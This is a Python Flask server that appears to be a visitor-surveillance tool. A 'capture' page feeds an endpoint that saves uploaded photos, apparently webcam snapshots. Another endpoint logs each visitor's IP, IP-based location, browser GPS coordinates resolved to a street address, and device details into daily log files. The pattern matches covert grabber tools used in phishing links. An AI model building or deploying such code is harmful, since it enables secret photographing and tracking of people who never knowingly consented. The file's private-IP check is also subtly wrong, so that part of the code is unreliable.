import os
import re
import json
import requests
import datetime
from flask import Flask, request, jsonify, render_template, send_from_directory

app = Flask(__name__, static_folder='static', template_folder='templates')

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def get_client_ip():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
    else:
        ip = request.remote_addr
    return ip or 'unknown'

def is_public_ip(ip):
    private_prefixes = ('10.', '172.', '192.', '127.', '0.')
    return not ip.startswith(private_prefixes)

def parse_device_name(user_agent):
    match = re.search(r'\(([^)]+)\)', user_agent)
    return match.group(1) if match else "Unknown"

def reverse_geocode(lat, lon):
    try:
        resp = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={"lat": lat, "lon": lon, "format": "json"},
            headers={"User-Agent": "FlaskApp"}
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                "display_name": data.get("display_name"),
                "city": data.get("address", {}).get("city") or data.get("address", {}).get("town") or data.get("address", {}).get("village"),
                "region": data.get("address", {}).get("state"),
                "country": data.get("address", {}).get("country")
            }
    except requests.RequestException:
        return {"error": "Reverse geocoding failed"}
    return {}

@app.route('/')
def capture():
    return render_template('capture.html')

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    if 'photo' not in request.files:
        return jsonify({'error': 'No photo part'}), 400
    file = request.files['photo']
    if not file or file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    filename = datetime.datetime.now().strftime('photo_%Y%m%d%H%M%S.png')
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)
    app.logger.info(f"Photo saved: {filepath}")
    return jsonify({'status': 'success', 'filename': filename})

@app.route('/submit-device-info', methods=['POST'])
def submit_device_info():
    visitor_ip = get_client_ip()
    client_data = request.json or {}
    location = {}
    if is_public_ip(visitor_ip):
        try:
            resp = requests.get(f'https://ipinfo.io/{visitor_ip}/json', timeout=5)
            if resp.status_code == 200:
                loc_json = resp.json()
                location = {
                    'city': loc_json.get('city', ''),
                    'region': loc_json.get('region', ''),
                    'country': loc_json.get('country', '')
                }
        except requests.RequestException:
            location = {'error': 'Failed to get geo info'}
    else:
        location = {'info': 'Local or private IP - no geo lookup'}

    browser_lat = None
    browser_lon = None
    browser_place = None
    if 'location' in client_data and client_data['location']:
        browser_lat = client_data['location'].get('lat')
        browser_lon = client_data['location'].get('lon')
        if browser_lat and browser_lon:
            browser_place = reverse_geocode(browser_lat, browser_lon)

    ua = client_data.get('userAgent', '')
    device_name = parse_device_name(ua)
    client_data['deviceName'] = device_name

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")

    record = {
        'timestamp': timestamp,
        'ip': visitor_ip,
        'location': location,
        'browser_place': browser_place,
        'client_info': client_data
    }

    # Save and rotate logs per day
    log_filename = f"visitor_log_{datetime.date.today().isoformat()}.txt"
    with open(log_filename, 'a', encoding='utf-8') as f:
        f.write(json.dumps(record, indent=4) + '\n\n')

    # Print to terminal immediately
    print("---- New Visitor Log ----")
    print(json.dumps(record, indent=4))
    print("-------------------------\n")

    return jsonify({"status": "logged"})

@app.route('/nextpage')
def nextpage():
    return render_template('nextpage.html')

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(app.static_folder, 'favicon.ico')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=True)
